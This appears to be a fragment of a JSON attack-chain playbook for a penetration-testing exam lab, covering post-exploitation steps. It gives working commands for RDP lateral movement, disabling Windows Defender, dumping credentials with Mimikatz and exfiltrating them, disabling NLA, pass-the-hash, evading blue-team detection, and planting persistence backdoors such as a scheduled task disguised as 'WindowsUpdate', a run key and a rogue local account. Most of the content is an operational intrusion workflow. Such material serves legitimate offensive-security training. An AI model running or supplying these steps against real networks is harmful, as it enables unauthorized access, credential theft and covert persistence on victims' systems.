      "description": "RDP vs WMI TRADE-OFFS:\n- WMI: Stealthier, command-line only, works with NTLM hashes\n- RDP: GUI access, easier for manual tasks, requires plaintext passwords (or NLA bypass)\n\nUSE RDP WHEN:\n(1) Need GUI access (e.g., accessing GUI-only applications, navigating unfamiliar systems)\n(2) Manual file browsing (easier than command-line SMB)\n(3) Screenshot/screen recording for proof (security assessment evidence)\n(4) Accessing systems where command-line tools restricted\n\nXFREERDP COMMAND (RECOMMENDED for Kali):\nxfreerdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET>:3389 /cert-ignore +clipboard /dynamic-resolution\n\nFull example:\nxfreerdp /u:dave /p:'Welcome2023' /d:corp.com /v:192.168.50.75:3389 /cert-ignore +clipboard /dynamic-resolution\n\nFlags explained:\n/u: Username (from credentials.txt - cracked passwords)\n/p: Plaintext password (REQUIRED for RDP - cannot use NTLM hash without NLA bypass)\n/d: Domain name\n/v: Target IP:Port (default RDP port 3389)\n/cert-ignore: Ignore certificate errors (self-signed certs common)\n+clipboard: Enable clipboard sharing (copy/paste between Kali and target)\n/dynamic-resolution: Auto-adjust RDP window to your screen size\n\nOPTIONAL USEFUL FLAGS:\n+drives: Mount local Kali drives in RDP session (\\\\\\\\tsclient\\\\drives\\\\)\n/size:1920x1080: Set specific resolution\n/drive:share,/home/kali/transfer: Mount specific local directory as share\n/network:lan: Optimize for LAN connection (better performance)\n\nALTERNATIVE: RDESKTOP (Older tool, less features):\nrdesktop -u dave -p Welcome2023 -d corp.com -r disk:share=/home/kali/transfer 192.168.50.75\n\nPRIORITIZATION (From pwned_systems.txt and spray results):\n\n(1) DOMAIN CONTROLLERS: Full domain control, SYSVOL/GPO access, AD database\n(2) FILE SERVERS: Document shares, backup files, sensitive data\n(3) DATABASE SERVERS (SQL): Database dumps, application credentials in configs\n(4) ADMIN WORKSTATIONS: IT admin tools, cached credentials for multiple systems\n(5) USER WORKSTATIONS: Lower priority (less sensitive data typically)\n\nRDP WORKFLOW:\n\n1. Connect:\nxfreerdp /u:Administrator /p:'Password123!' /d:corp.com /v:192.168.50.95 /cert-ignore +clipboard\n\n2. Initial actions:\n- Open Command Prompt: Win+R \u2192 cmd\n- Check privileges: whoami /all\n- Disable Windows Defender (if admin): Set-MpPreference -DisableRealtimeMonitoring $true\n- Check running processes: tasklist\n- Check network connections: netstat -ano\n\n3. File exfiltration:\n- Browse to sensitive locations:\n  C:\\\\Users\\\\Administrator\\\\Desktop\n  C:\\\\Users\\\\*\\\\Documents\n  \\\\\\\\DC01\\\\SYSVOL\\\\corp.com\\\\scripts (domain scripts, sometimes contain credentials)\n- Copy files via clipboard (+clipboard flag) OR shared drives (+drives flag)\n\n4. Credential harvesting:\n- Transfer Mimikatz via shared drive or clipboard\n- Run: mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > creds.txt\n- Exfiltrate creds.txt\n\n5. Screenshot evidence (security assessment):\n- Win+PrntScr \u2192 Screenshots saved to Pictures/Screenshots\n- OR: Use Kali screenshot tool (scrot, flameshot) to capture RDP window\n\nCREDENTIAL MAPPING:\n\nFrom credentials.txt (step 4 output):\nAdministrator:Password123!\ndave:Welcome2023\njohn:CompanyName1!\n\nFrom pwned_systems.txt (step 6 output):\n192.168.50.95 - Administrator (Pwn3d!) \u2192 RDP: 192.168.50.95 (HIGH PRIORITY - Admin account)\n192.168.50.75 - dave (Pwn3d!) \u2192 RDP: 192.168.50.75\n192.168.50.82 - john (Pwn3d!) \u2192 RDP: 192.168.50.82\n\nNLA (Network Level Authentication) ISSUES:\n\nModern Windows enables NLA by default - prevents RDP with NTLM hash (requires plaintext password).\n\nIf NLA error:\n\"The remote computer requires Network Level Authentication, which your computer does not support\"\n\nSOLUTION 1: Use cracked plaintext password (preferred - already done in step 4)\nSOLUTION 2: Disable NLA remotely (requires admin access):\nreg add \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\n(Execute via wmiexec before RDP attempt)\n\nSOLUTION 3: Use Restricted Admin mode (allows PTH for RDP - Windows 2012R2+):\nxfreerdp /u:dave /pth:a9b30e5b0dc865eadcea9411e4ade72d /d:corp.com /v:192.168.50.75 +restricted-admin\n\nOPSEC CONSIDERATIONS:\n\n- RDP logon = EventID 4624 (Logon Type 10 - RemoteInteractive)\n- More suspicious than WMI (Type 3 - Network)\n- BLUE TEAM DETECTION: Unusual source IPs for RDP, off-hours access, admin RDP from workstation\n- STEALTH: RDP during business hours, from IT-related IPs if possible\n\nFAILURE SCENARIOS:\n\n- Account not authorized for RDP: \"Remote Desktop Users\" group membership required\n  \u2192 Fix: Add user remotely via wmiexec: net localgroup \"Remote Desktop Users\" dave /add\n\n- RDP port 3389 blocked: Firewall or host-based filtering\n  \u2192 Alternative: Port forward via compromised system OR use different access method (WMI)\n\n- NLA authentication required: See NLA solutions above\n\n- Connection timeout: RDP service not running OR port blocked\n  \u2192 Enable remotely: reg add \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nTIME ESTIMATE: 5-10 minutes per high-value target (connection, recon, evidence gathering).",
      "command_ref": "windows-rdp-xfreerdp",
      "evidence": [
        "RDP connection established to high-value targets",
        "GUI access confirmed (desktop visible)",
        "Sensitive files accessed and exfiltrated",
        "Screenshots captured for exam proof",
        "Additional credentials harvested from target systems"
      ],
      "dependencies": [
        "lateral-movement-wmiexec"
      ],
      "repeatable": true,
      "success_criteria": [
        "RDP access obtained to at least one high-priority target",
        "GUI interaction successful",
        "Files exfiltrated or sensitive data accessed",
        "Evidence collected for reporting"
      ],
      "failure_conditions": [
        "NLA authentication required (no plaintext password available - must use cracked passwords)",
        "User not in Remote Desktop Users group (permission denied)",
        "RDP port 3389 blocked (firewall restriction)",
        "Connection timeout (RDP service not running)"
      ],
      "next_steps": [
        "document-compromised-hosts"
      ]
    },
    {
      "id": "document-compromised-hosts",
      "name": "Document All Compromised Systems and Maintain Access",
      "objective": "Create comprehensive inventory of compromised assets and establish persistence mechanisms",
      "description": "DOCUMENTATION REQUIREMENTS: Maintain detailed records of all compromised systems for exam reporting and operational tracking.\n\nCOMPROMISED SYSTEMS INVENTORY:\n\nCreate master spreadsheet/markdown table:\n\n| IP Address      | Hostname | OS           | Access Method | User Account   | Admin Level | Credentials           | Notes                  |\n|----------------|----------|--------------|---------------|----------------|-------------|-----------------------|------------------------|\n| 192.168.50.75  | WS01     | Win10 Pro    | WMI/RDP       | dave           | Local Admin | dave:Welcome2023      | HR workstation         |\n| 192.168.50.82  | WS02     | Win10 Ent    | WMI           | john           | Local Admin | john:CompanyName1!    | Dev workstation        |\n| 192.168.50.95  | DC01     | Server 2019  | PSExec/RDP    | Administrator  | Domain Admin| Administrator:Pass123!| Domain Controller      |\n| 192.168.50.100 | SQL01    | Server 2016  | WMI           | sqlsvc         | Local Admin | sqlsvc:SQLPass2023    | Database server        |\n\nFile: /home/kali/loot/dcsync_[date]/compromised_hosts.md\n\nCREDENTIAL DATABASE:\n\nOrganize all extracted credentials:\n\n/home/kali/loot/dcsync_[date]/\n\u251c\u2500\u2500 domain_hashes.ntds (original DCSync output - ALL users)\n\u251c\u2500\u2500 ntlm_hashes.txt (pure NTLM hashes for Hashcat)\n\u251c\u2500\u2500 credentials.txt (cracked username:password pairs)\n\u251c\u2500\u2500 spray_results.txt (crackmapexec PTH spray full output)\n\u251c\u2500\u2500 pwned_systems.txt (systems with local admin access)\n\u251c\u2500\u2500 compromised_hosts.md (detailed inventory table)\n\u2514\u2500\u2500 persistence_mechanisms.md (backup access methods)\n\nBACKUP ACCESS METHODS:\n\nDocument multiple access paths to critical systems (in case primary method blocked):\n\n(1) NTLM HASH ACCESS (survives password changes until hash rotation):\nSystem: DC01 (192.168.50.95)\nUser: Administrator\nNTLM Hash: a9b30e5b0dc865eadcea9411e4ade72d\nAccess: impacket-psexec -hashes :a9b30e5b0dc865eadcea9411e4ade72d corp.com/Administrator@192.168.50.95\n\n(2) PLAINTEXT PASSWORD ACCESS:\nSystem: SQL01 (192.168.50.100)\nUser: sqlsvc\nPassword: SQLPass2023\nAccess: xfreerdp /u:sqlsvc /p:'SQLPass2023' /d:corp.com /v:192.168.50.100 /cert-ignore\n\n(3) CREATED LOCAL ACCOUNTS (if created during engagement):\nSystem: WS01 (192.168.50.75)\nUser: hacker (created via WMI)\nPassword: Passw0rd123!\nAccess: RDP or WMI as hacker user\n\n(4) GOLDEN TICKET (if created in parallel - ultimate persistence):\nDomain: corp.com\nkrbtgt hash: [from domain_hashes.ntds]\nDomain SID: [from DCSync output]\nAccess: See Golden Ticket chain for re-access procedure\n\nPERSISTENCE MECHANISMS:\n\nOptional - If extended access required:\n\n(1) SSH BACKDOOR (via OpenSSH on Windows):\nVia WMI/RDP on target:\nAdd-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\nStart-Service sshd\nSet-Service -Name sshd -StartupType 'Automatic'\nNew-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22\n\nAccess: ssh dave@192.168.50.75\n\n(2) SCHEDULED TASK BACKDOOR:\nVia WMI:\nschtasks /create /tn \"WindowsUpdate\" /tr \"C:\\\\Windows\\\\Temp\\\\backdoor.exe\" /sc onlogon /ru SYSTEM\n\n(3) REGISTRY RUN KEY:\nreg add \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v Update /t REG_SZ /d \"C:\\\\Windows\\\\Temp\\\\backdoor.exe\" /f\n\nREPORTING SUMMARY:\n\nFor exam report, document:\n\n1. DCSYNC STATISTICS:\n   - Total domain users: [from domain_hashes.ntds line count]\n   - Hashes extracted: [total count]\n   - Passwords cracked: [count] ([percentage]%)\n   - Time taken: [total time from step 1-4]\n\n2. LATERAL MOVEMENT SUCCESS:\n   - Systems scanned: [IP range]\n   - Systems with admin access: [count from pwned_systems.txt]\n   - Systems compromised: [count from compromised_hosts.md]\n   - Access methods used: WMI, PSExec, RDP\n\n3. HIGH-VALUE TARGETS:\n   - Domain Controllers: [list]\n   - Database Servers: [list]\n   - File Servers: [list]\n   - Admin Workstations: [list]\n\n4. CREDENTIALS HARVESTED:\n   - Domain Admin accounts: [count]\n   - Service accounts: [count]\n   - User accounts: [count]\n   - Total unique passwords: [count]\n\n5. PERSISTENCE:\n   - Golden Ticket: [Yes/No - if created]\n   - Backup accounts: [count created]\n   - Alternative access methods: [list]\n\nEXAM PROOF:\n\nScreenshots required:\n- DCSync output (domain_hashes.ntds showing multiple users)\n- Hashcat cracked passwords (hashcat --show output)\n- crackmapexec spray results (showing Pwn3d! indicators)\n- WMI/PSExec shell (whoami showing SYSTEM or admin user)\n- RDP desktop showing hostname, IP, username\n- Proof.txt or local.txt file contents from compromised systems\n\nSAVE ALL EVIDENCE:\nmkdir -p /home/kali/exam_evidence/dcsync_mass_extraction\ncp -r /home/kali/loot/dcsync_[date]/* /home/kali/exam_evidence/dcsync_mass_extraction/\nscrot -s /home/kali/exam_evidence/dcsync_mass_extraction/screenshots/\n\nTIME ESTIMATE: 10-15 minutes (comprehensive documentation and evidence collection).",
      "command_ref": "crackmapexec-validate-admin",
      "evidence": [
        "compromised_hosts.md created with complete inventory",
        "credentials.txt organized and backed up",
        "persistence_mechanisms.md documented",
        "All evidence files organized in structured directory",
        "Screenshots captured for exam proof",
        "Backup access methods tested and verified"
      ],
      "dependencies": [
        "rdp-high-value-targets"
      ],
      "repeatable": true,
      "success_criteria": [
        "All compromised systems documented in inventory",
        "Credentials organized and accessible",
        "Multiple access paths documented for critical systems",
        "Evidence collection complete for reporting",
        "Backup access methods verified"
      ],
      "failure_conditions": [
        "Incomplete documentation (missing systems or credentials)",
        "Evidence files lost or disorganized",
        "Backup access methods not tested (may fail when needed)",
        "Screenshots missing (insufficient exam proof)"
      ],
      "next_steps": []
    }
  ]
}